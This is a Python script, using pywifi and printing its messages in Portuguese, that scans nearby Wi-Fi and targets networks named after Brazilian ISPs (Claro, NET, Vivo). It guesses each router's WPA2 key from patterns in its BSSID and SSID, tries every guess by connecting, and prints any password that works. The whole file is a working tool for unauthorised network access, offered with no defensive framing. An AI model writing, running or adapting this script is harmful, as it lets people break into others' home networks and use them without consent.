import pywifi
from pywifi import const
import time


class bcolors:

    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

wifi = pywifi.PyWiFi()

print(wifi.interfaces()[2].name())
iface = wifi.interfaces()[2]
print(bcolors.MAGENTA + 'Buscando as redes disponíveis...')
iface.scan()
time.sleep(5)
results = iface.scan_results()


def wifiConnection(wifi, pwd):
	print('Tentando conectar com a senha '+ pwd)
	iface.disconnect()
	time.sleep(3)
    
	wifiStatus = iface.status()
    
	if wifiStatus == const.IFACE_DISCONNECTED:
		#  establish wifi The connection file for 
		profile = pywifi.Profile()  
		#  To connect wifi The name of 
		profile.ssid = wifi.ssid
		#  Open to network card 
		profile.auth = const.AUTH_ALG_OPEN
		# wifi encryption algorithm 
		profile.akm.append(const.AKM_TYPE_WPA2PSK)
		#  Encryption unit 
		profile.cipher = const.CIPHER_TYPE_CCMP
		#  password 
		profile.key = pwd
		#  Delete all wifi file 
		iface.remove_all_network_profiles()
		#  Set up a new connection file 
		tep_profile = iface.add_network_profile(profile)
		#  Test the connection with a new connection file 
		iface.connect(tep_profile)
		#  to wifi A connection time 
		time.sleep(6)
		if iface.status() == const.IFACE_CONNECTED:
			return True
		else:
			return False
	else:
        # deu erro... tentando conectar novamente
		wifiConnection(wifi, pwd)
        



def connect(wifi):
    bssid = wifi.bssid
    ssid  = wifi.ssid
    password = bssid.replace(":","").upper()[4:]
    password2 = bssid.replace(":","").upper()[4:8] + ssid[-4:]
    password3 = bssid.replace(":","").upper()[2:]
    password4 = bssid.replace(":","").upper()[2:8] + ssid[-4:]
    #print(f"{bssid}: {ssid} Pass: {password} ou {password2} ou {password3} ou {password4}")

    print(bcolors.YELLOW + 'Tentando conectar na rede ' + ssid )
    if (wifiConnection(wifi, password)):
        print(bcolors.BLUE + '[+] Conectado a rede ' + ssid + ' com a senha ' + password)
    elif(wifiConnection(wifi, password2)):
        print(bcolors.BLUE + '[+] Conectado a rede ' + ssid + ' com a senha ' + password2)
    elif(wifiConnection(wifi, password3)):
        print(bcolors.BLUE + '[+] Conectado a rede ' + ssid + ' com a senha ' + password3)
    elif(wifiConnection(wifi, password4)):
        print(bcolors.BLUE + '[+] Conectado a rede ' + ssid + ' com a senha ' + password4)
    else:
        print(bcolors.RED + 'Não foi possível conectar na rede ' + ssid )

for wifi in results:
    ssid  = wifi.ssid
    # print(f"{bssid}: {ssid}")
    if (ssid.find('CLARO_') != -1):
        # print('Claro : ' + ssid)
        connect(wifi)
    elif (ssid.find('NET_') != -1):
        # print('Net : ' + ssid)
        connect(wifi)
    elif (ssid.find('VIVO-') != -1):
        # print('Vivo : ' + ssid)
        connect(wifi)
    elif (ssid.find('VIVOFIBRA') != -1):
        # print('Vivo : ' + ssid)
        connect(wifi)


